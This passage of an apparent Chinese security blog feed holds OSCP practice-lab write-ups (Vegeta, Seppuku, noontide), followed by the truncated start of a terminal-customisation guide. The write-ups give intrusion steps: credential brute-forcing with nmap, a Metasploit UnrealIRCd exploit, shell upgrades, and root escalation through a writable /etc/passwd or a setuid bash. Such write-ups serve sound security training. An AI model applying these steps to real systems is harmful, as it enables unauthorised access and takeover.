class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h1><h2 id="1、首页源代码"><a href="#1、首页源代码" class="headerlink" title="1、首页源代码"></a>1、首页源代码</h2><p><img src="/img/OSCP-Vegeta/image-20240823122833521.png" alt="image-20240823122833521"></p><p>首页就一张图片</p><p><img src="/img/OSCP-Vegeta/image-20240823122853320.png" alt="image-20240823122853320"></p><p>看过了，没捆绑没隐写</p><h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><p>gobuster扫描结果，发现四个目录，其中admin 令我们很感兴趣</p><p><img src="/img/OSCP-Vegeta/image-20240823123547386.png" alt="image-20240823123547386"></p><p>&#x2F;admin 里面只有一个 admin.php 文件</p><p><img src="/img/OSCP-Vegeta/image-20240823123621404.png" alt="image-20240823123621404"></p><p>推测有类似ctf 那样有源码泄露的地方，但是这个文件夹就它一个文件，且字节大小只有9</p><p><img src="/img/OSCP-Vegeta/image-20240823123742142.png" alt="image-20240823123742142"></p><p>robots.txt 文件给出了提示</p><p><img src="/img/OSCP-Vegeta/image-20240823134636819.png" alt="image-20240823134636819"></p><p>指向了一个<code>Vegeta-1.0</code>的提示</p><p><img src="/img/OSCP-Vegeta/image-20240823134713611.png" alt="image-20240823134713611"></p><p>在页面源代码给出了base64编码的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== --&gt;</span><br></pre></td></tr></table></figure><p>对其二次base64解密发现文件头存在png</p><p><img src="/img/OSCP-Vegeta/image-20240823140240105.png" alt="image-20240823140240105"></p><p>更改png后缀发现是二维码，二维码解析器查看给了一个密码</p><img src="/img/OSCP-Vegeta/image-20240823141253722.png" alt="image-20240823141253722" style="zoom:150%;" /><p>现在差个用户名，cewl 收集一波关键字</p><p><img src="/img/OSCP-Vegeta/image-20240823141446676.png" alt="image-20240823141446676"></p><p>尝试一波爆破，很明显失败了</p><p><img src="/img/OSCP-Vegeta/image-20240823141755467.png" alt="image-20240823141755467"></p><h2 id="3、进一步的信息收集"><a href="#3、进一步的信息收集" class="headerlink" title="3、进一步的信息收集"></a>3、进一步的信息收集</h2><p>我们用一个大点的字典再次做了目录扫描，发现一个新的端点</p><p><img src="/img/OSCP-Vegeta/image-20240823142923712.png" alt="image-20240823142923712"></p><p>里面是一个wav 格式的文件，是个音频</p><p><img src="/img/OSCP-Vegeta/image-20240823143037254.png" alt="image-20240823143037254"></p><p>浅听了一下，嘀嘀嘀的断点声，摩斯密码欸，在线解码下：<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">Morse Code Adaptive Audio Decoder | Morse Code World</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USER : TRUNKS PASSWORD : US3R&lt;KN&gt;S IN DOLLARS SYMBOL)</span><br></pre></td></tr></table></figure><p>推测密码应该是US3R 这部分，但是尝试却是失败的；</p><h1 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h1><p>丢给AI 分析一下</p><p><img src="/img/OSCP-Vegeta/image-20240823145642107.png" alt="image-20240823145642107"></p><p>把密码里面的S改成美元$符号，再次尝试</p><p><img src="/img/OSCP-Vegeta/image-20240823145918586.png" alt="image-20240823145918586"></p><p>果然，成功getshell</p><p><img src="/img/OSCP-Vegeta/image-20240823145955199.png" alt="image-20240823145955199"></p><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><p>历史命令中有点东西昂</p><p><img src="/img/OSCP-Vegeta/image-20240823150051647.png" alt="image-20240823150051647"></p><p>我是否可以向&#x2F;etc&#x2F;passwd 文件中写入用户呢？</p><p>查看&#x2F;etc&#x2F;passwd 文件的权限</p><p><img src="/img/OSCP-Vegeta/image-20240823151134142.png" alt="image-20240823151134142"></p><p>啊？，trunks 用户具有&#x2F;etc&#x2F;passwd 的读写权限，那这就好办了</p><h2 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h2><p>直接向&#x2F;etc&#x2F;passwd 文件中写入管理员用户</p><p><img src="/img/OSCP-Vegeta/image-20240823151653139.png" alt="image-20240823151653139"></p><p>成功提权至root</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—Seppuku</title>
      <link href="/2024/08/22/OSCP-Seppuku/"/>
      <url>/2024/08/22/OSCP-Seppuku/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—Seppuku"><a href="#OSCP系列靶机—Seppuku" class="headerlink" title="OSCP系列靶机—Seppuku"></a>OSCP系列靶机—Seppuku</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Seppuku/image-20240822200229186.png" alt="image-20240822200229186"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速探测"><a href="#1、快速探测" class="headerlink" title="1、快速探测"></a>1、快速探测</h3><p><img src="/img/OSCP-Seppuku/image-20240822200315169.png" alt="image-20240822200315169"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-Seppuku/image-20240822200410103.png" alt="image-20240822200410103"></p><p><img src="/img/OSCP-Seppuku/image-20240822200436648.png" alt="image-20240822200436648"></p><p>同时探测UDP常用的20个端口，没有准确的开放端口</p><h3 id="3、服务版本探测"><a href="#3、服务版本探测" class="headerlink" title="3、服务版本探测"></a>3、服务版本探测</h3><p><img src="/img/OSCP-Seppuku/image-20240822200810277.png" alt="image-20240822200810277"></p><p>给了很多版本和服务的信息，以及推测存在于linux 4.x|5.x 的版本，版本较高</p><p>80端口的HTTP服务提示401未授权，7080开放在一个携带ssl 的http服务，7601、8088都开放了一个http服务</p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><p><img src="/img/OSCP-Seppuku/image-20240822201455333.png" alt="image-20240822201455333"></p><p>在80端口显示很多目录文件，但是都给出401 未授权提示</p><p><img src="/img/OSCP-Seppuku/image-20240822202031346.png" alt="image-20240822202031346"></p><p>7080端口给出一个empowerid 服务，网查了一下，可以搜索官网深入了解</p><blockquote><p>EmpowerID 是一款身份管理和访问控制解决方案，它提供了一套全面的服务来帮助企业安全地管理用户的身份和访问权限。</p></blockquote><p>这里nmap给出了CVE-2010-2333 的漏洞，表明这个服务存在一个源代码泄露的CVE编号漏洞，在后面的渗透过程中可能存在利用</p><p><img src="/img/OSCP-Seppuku/image-20240822202631798.png" alt="image-20240822202631798"></p><p>8088 端口给出了一个易受DOs攻击的薄弱点，再次给出了CVE-2010-2333 的漏洞，并在后面给出了一个html 页面的源代码</p><p><img src="/img/OSCP-Seppuku/image-20240822202904756.png" alt="image-20240822202904756"></p><p>在针对主机的脚本扫描中，指出smb服务易受<code>smb-vuln-regsvc-dos</code>攻击，易受拒绝服务而崩溃</p><h2 id="三、FTP信息收集"><a href="#三、FTP信息收集" class="headerlink" title="三、FTP信息收集"></a>三、FTP信息收集</h2><p>nmap并未扫描出ftp 存在未授权，尝试未授权登陆</p><p><img src="/img/OSCP-Seppuku/image-20240822203433673.png" alt="image-20240822203433673"></p><p>不能登陆</p><h2 id="四、SMB信息收集"><a href="#四、SMB信息收集" class="headerlink" title="四、SMB信息收集"></a>四、SMB信息收集</h2><p><img src="/img/OSCP-Seppuku/image-20240822204635390.png" alt="image-20240822204635390"></p><p>SMB也没有可利用的点</p><h2 id="五、HTTP信息收集"><a href="#五、HTTP信息收集" class="headerlink" title="五、HTTP信息收集"></a>五、HTTP信息收集</h2><h3 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h3><p><img src="/img/OSCP-Seppuku/image-20240822205201852.png" alt="image-20240822205201852"></p><p>一个授权的登陆，但是我们不知道账号密码</p><p>让nmap 进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=http-brute -p80 192.168.31.83</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Seppuku/image-20240822210021953.png" alt="image-20240822210021953"></p><p>未发现账号密码，之前nmap 给出目录扫描结果中都是401的未授权，所以也没有做目录扫描的必要了</p><h3 id="2、7080信息收集"><a href="#2、7080信息收集" class="headerlink" title="2、7080信息收集"></a>2、7080信息收集</h3><p><img src="/img/OSCP-Seppuku/image-20240822210121246.png" alt="image-20240822210121246"></p><p>一个404的页面，但是在nmap扫描中给出LiteSpeed web服务，下面对这个软件做一个简单的介绍</p><blockquote><p>LiteSpeed Web Server (LSWS) 是一款以快速性能和高可扩展性而知名的专有网络服务器软件，同时也提供了一流的安全性，例如内置功能有助于防止分布式拒绝服务（DDOS）攻击 。它与广泛使用的Apache网络服务器完全兼容，这意味着用户可以在不改变现有应用程序或操作系统的情况下，无缝切换到LiteSpeed 。</p></blockquote><p>做一个目录扫描</p><p><img src="/img/OSCP-Seppuku/image-20240822210918213.png" alt="image-20240822210918213"></p><p><img src="/img/OSCP-Seppuku/image-20240822210930494.png" alt="image-20240822210930494"></p><p><strong>OpenLiteSpeed Web Server 1.6</strong> 是否存在漏洞呢</p><p><img src="/img/OSCP-Seppuku/image-20240822211139116.png" alt="image-20240822211139116"></p><p>这几个版本不对应</p><h3 id="3、7601信息收集"><a href="#3、7601信息收集" class="headerlink" title="3、7601信息收集"></a>3、7601信息收集</h3><p><img src="/img/OSCP-Seppuku/image-20240822212239814.png" alt="image-20240822212239814"></p><p>首页一张图，图片也没有隐藏的信息；做目录扫描</p><p><img src="/img/OSCP-Seppuku/image-20240822212703788.png" alt="image-20240822212703788"></p><p>看敏感目录的时候发现</p><p><img src="/img/OSCP-Seppuku/image-20240822212749645.png" alt="image-20240822212749645"></p><p>翻到shadow.bak 的备份文件，不过这个散列值不是那么容易破解的啊，但是上面好像还有个password.lst 文件</p><p><img src="/img/OSCP-Seppuku/image-20240822214537146.png" alt="image-20240822214537146"></p><p>啊？是不是有点过分了，甚至还有个passwd.bak 的备份文件，做个爆破</p><p><img src="/img/OSCP-Seppuku/image-20240822214937702.png" alt="image-20240822214937702"></p><p>没有欸，用其他的目录扫描工具</p><p><img src="/img/OSCP-Seppuku/image-20240822223836580.png" alt="image-20240822223836580"></p><p>发现多了几个其他的路径</p><h2 id="六、Getshell"><a href="#六、Getshell" class="headerlink" title="六、Getshell"></a>六、Getshell</h2><p>对 shadow.bak 中的 <code>rabbit-hole</code> 的用户名密码进行爆破</p><p><img src="/img/OSCP-Seppuku/image-20240822215455478.png" alt="image-20240822215455478"></p><p>OK啊，非常的快速且精准</p><p><img src="/img/OSCP-Seppuku/image-20240822215822915.png" alt="image-20240822215822915"></p><p>但是，拉跨了，密码不对，应该是被改掉了，看来这个<code>r@bbit-hole</code>用户登陆不了了</p><p>我们还有一个 <code>hostname</code>没用</p><p><img src="/img/OSCP-Seppuku/image-20240822220435169.png" alt="image-20240822220435169"></p><p>成功getshell</p><p><img src="/img/OSCP-Seppuku/image-20240822220603505.png" alt="image-20240822220603505"></p><h2 id="七、权限提升"><a href="#七、权限提升" class="headerlink" title="七、权限提升"></a>七、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>我们需要优化我们的shell，后面每一个都需要优化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Seppuku/image-20240822220653308.png" alt="image-20240822220653308"></p><p>这个文件有点意思昂，尝试登陆到其他用户</p><h3 id="2、提权至samurai"><a href="#2、提权至samurai" class="headerlink" title="2、提权至samurai"></a>2、提权至samurai</h3><p><img src="/img/OSCP-Seppuku/image-20240822222951615.png" alt="image-20240822222951615"></p><p>查找提权信息</p><p><img src="/img/OSCP-Seppuku/image-20240822223938600.png" alt="image-20240822223938600"></p><p>这里有点鸡肋昂</p><h3 id="3、提权至tanto"><a href="#3、提权至tanto" class="headerlink" title="3、提权至tanto"></a>3、提权至tanto</h3><p>回到之前的目录扫描中发现的keys路径，发现了某个ssh密钥</p><p><img src="/img/OSCP-Seppuku/image-20240822224005623.png" alt="image-20240822224005623"></p><p>尝试用密钥连接</p><p><img src="/img/OSCP-Seppuku/image-20240822224154473.png" alt="image-20240822224154473"></p><p>成功提权至tanto</p><h3 id="4、提权至root"><a href="#4、提权至root" class="headerlink" title="4、提权至root"></a>4、提权至root</h3><p>我们去创建 <code>home/tanto/.cgi_bin/bin</code> 文件，写入+s 的 &#x2F;bin&#x2F;bash</p><p><img src="/img/OSCP-Seppuku/image-20240822230148400.png" alt="image-20240822230148400"></p><p>直接提权至root</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-noontide</title>
      <link href="/2024/08/22/OSCP-noontide/"/>
      <url>/2024/08/22/OSCP-noontide/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—InfosecPrep"><a href="#OSCP系列靶机—InfosecPrep" class="headerlink" title="OSCP系列靶机—InfosecPrep"></a>OSCP系列靶机—InfosecPrep</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-noontide/image-20240822125212542.png" alt="image-20240822125212542"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-noontide/image-20240822125308279.png" alt="image-20240822125308279"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-noontide/image-20240822125440942.png" alt="image-20240822125440942"></p><p>探测全tcp 端口，并探测常用的20个UDP端口</p><p><img src="/img/OSCP-noontide/image-20240822125518212.png" alt="image-20240822125518212"></p><p>tcp 有几个陌生的协议，udp基本上处于全关闭状态</p><p>上网搜寻了有关IRC 协议的信息</p><blockquote><p>IRC，即Internet Relay Chat（互联网中继聊天），是一种用于在线通信的协议。它允许用户在实时环境中通过文本消息进行交流。IRC 协议最初在1988年由Jarkko Oikarinen创建，主要目的是为了提供一个多用户实时聊天系统。用户可以加入不同的“频道”或“房间”，在那里与其他人进行交流。</p></blockquote><h3 id="3、服务版本探测"><a href="#3、服务版本探测" class="headerlink" title="3、服务版本探测"></a>3、服务版本探测</h3><p><img src="/img/OSCP-noontide/image-20240822131001560.png" alt="image-20240822131001560"></p><p>给了我们IRC协议的版本信息，和一个Admin 用户和 一个邮箱，不过好像没啥用昂；推测可能的版本在 Linux 3.5或Linux 3.1 的可能性大，系统版本较低，可能存在脏牛提权</p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><p><img src="/img/OSCP-noontide/image-20240822131302680.png" alt="image-20240822131302680"></p><p>没啥消息</p><h2 id="三、IRC协议GETshell"><a href="#三、IRC协议GETshell" class="headerlink" title="三、IRC协议GETshell"></a>三、IRC协议GETshell</h2><p>有兴趣可以在在kali 中安装irrsi 的IRC 客户端工具启动</p><p><img src="/img/OSCP-noontide/image-20240822131554883.png" alt="image-20240822131554883"></p><p>第一次启动会给我们很多的信息，表示如果你是第一次使用可以去官网看一看使用手册，<code>/HELP</code>命令可以查看帮助文档。</p><p>不过我们的重点不在这里，重点是我们可以搜索有关IRC协议的漏洞</p><p><img src="/img/OSCP-noontide/image-20240822134811048.png" alt="image-20240822134811048"></p><p>在MSF中搜索有关UnrealIRCd 版本的漏洞，出来一个，表示 UnrealIRCD 3.2.8.1 存在一个命令执行的漏洞，nmap并没有探测出准确的版本号，只能尝试获取shell</p><p><img src="/img/OSCP-noontide/image-20240822135717678.png" alt="image-20240822135717678"></p><p>修改payload 载荷，配置本地监听端口</p><p><img src="/img/OSCP-noontide/image-20240822135735967.png" alt="image-20240822135735967"></p><p>尝试攻击，成功获取shell</p><p><img src="/img/OSCP-noontide/image-20240822135806481.png" alt="image-20240822135806481"></p><h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>优化我们的shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure><p>查找信息，本以为系统版本较低，可能存在脏牛提权，但是一查看，发现版本还挺高，看来nmap有时候识别的偏差较大</p><p><img src="/img/OSCP-noontide/image-20240822142051184.png" alt="image-20240822142051184"></p><h3 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h3><p>经过一番查找，suid、sudo、计划任务均无果，在用户家目录下发现一个隐藏文件</p><p><img src="/img/OSCP-noontide/image-20240822142213554.png" alt="image-20240822142213554"></p><p>直接su 弱密码提权</p><p><img src="/img/OSCP-noontide/image-20240822142308081.png" alt="image-20240822142308081"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【其他经验】CMD终端美化记录—oh-my-posh</title>
      <link href="/2024/08/21/Extracurricular-experience-CMD-beautification/"/>
      <url>/2024/08/21/Extracurricular-experience-CMD-beautification/</url>
      
        <content type="html"><![CDATA[<h1 id="【其他经验】CMD终端美化记录—oh-my-posh"><a href="#【其他经验】CMD终端美化记录—oh-my-posh" class="headerlink" title="【其他经验】CMD终端美化记录—oh-my-posh"></a>【其他经验】CMD终端美化记录—oh-my-posh</h1><h2 id="一、安装Windows-Terminal"><a href="#一、安装Windows-Terminal" class="headerlink" title="一、安装Windows Terminal"></a>一、安装Windows Terminal</h2><h3 id="1、简单介绍下"><a href="#1、简单介绍下" class="headerlink" title="1、简单介绍下"></a><strong>1、简单介绍下</strong></h3><p>Windows Terminal 是微软开发的一款新的终端应用程序，它为命令行工具提供了一个现代化的界面。它支持 PowerShell、命令提示符（cmd）、WSL（Windows Subsystem for Linux）等多种命令行工具。Windows Terminal 不是 cmd，但它可以运行 cmd。</p><h3 id="2、下载地址"><a href="#2、下载地址" class="headerlink" title="2、下载地址"></a><strong>2、下载地址</strong></h3><p>1、微软自带的应用商店（推荐）</p><p>2、GitHub 目前最新版下载地址：<a href="https://github.com/microsoft/terminal/releases/">https://github.com/microsoft/terminal/releases/</a></p><p>这里推荐使用微软自带的应用商店下载，有些配置会默认帮我们配置好</p><h3 id="3、启动方式"><a href="#3、启动方式" class="headerlink" title="3、启动方式"></a>3、启动方式</h3><p>【win + R 输入wt 】即可启动</p><h3 id="4、配置成默认启动方式"><a href="#4、配置成默认启动方式" class="headerlink" title="4、配置成默认启动方式"></a>4、配置成默认启动方式</h3><p>在【设置】中配置默认终端应用程序，这样使用【cmd】命令即可打开该程序，右下角记得保存</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821192518313.png" alt="image-20240821192518313"></p><h2 id="二、安装nerd-字体"><a href="#二、安装nerd-字体" class="headerlink" title="二、安装nerd 字体"></a>二、安装nerd 字体</h2><h3 id="1、nerd-字体介绍"><a href="#1、nerd-字体介绍" class="headerlink" title="1、nerd 字体介绍"></a><strong>1、nerd 字体介绍</strong></h3><p>因为oh-my-post 在使用中有多个特殊字符，为了不显示乱码的情况，官方推荐使用 nerd fonts 字体</p><h3 id="2、下载方式"><a href="#2、下载方式" class="headerlink" title="2、下载方式"></a><strong>2、下载方式</strong></h3><p>1、官网下载链接（推荐）：<a href="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/0xProto.zip">https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/0xProto.zip</a></p><p>2、网上看到的百度网盘下载地址（安全性未知，请自辩）：链接：<a href="https://pan.baidu.com/s/1VAcGlRVoQeE59z73A1cEDw">百度网盘 请输入提取码</a> 提取码：uau7</p><h3 id="3、字体选择"><a href="#3、字体选择" class="headerlink" title="3、字体选择"></a><strong>3、字体选择</strong></h3><p>从官网下载的有三个字体文件，都大差不差，我选择了名称短的这个，总之感觉哪个都可以，文件的左上角有安装</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821185053955.png" alt="image-20240821185053955"></p><h3 id="4、配置字体"><a href="#4、配置字体" class="headerlink" title="4、配置字体"></a><strong>4、配置字体</strong></h3><p>在【默认值】的【外观】中配置字体，注意保存</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821192911748.png" alt="image-20240821192911748"></p><h2 id="三、oh-my-posh-下载安装"><a href="#三、oh-my-posh-下载安装" class="headerlink" title="三、oh-my-posh 下载安装"></a>三、oh-my-posh 下载安装</h2><h3 id="下载oh-my-posh"><a href="#下载oh-my-posh" class="headerlink" title="下载oh-my-posh"></a>下载oh-my-posh</h3><p>1、微软应用商店下载（推荐）：直接搜索oh-my-posh 就会出来</p><p>2、在Windows Terminal 中执行如下命令安装：winget install JanDeDobbeleer.OhMyPosh -s winget</p><p>3、GitHub下载，地址不贴了，自行搜索下</p><h2 id="四、美化powershell"><a href="#四、美化powershell" class="headerlink" title="四、美化powershell"></a>四、美化powershell</h2><h3 id="1、试用oh-my-posh-主题"><a href="#1、试用oh-my-posh-主题" class="headerlink" title="1、试用oh-my-posh 主题"></a>1、试用oh-my-posh 主题</h3><p>走到Terminal 的powershell 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-PoshThemes</span><br></pre></td></tr></table></figure><p>出来了很多其他的主题，在最后给了使用实例，选择一个主题，替换示例中的<code>jandedobbeleer</code>，</p><p><img src="/img/Extracurricular-experience-CMD-beautification/image-20240821205100529.png" alt="image-20240821205100529"></p><p>我在这里试用的是<code>honukai</code> 主题，则将命令修改成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 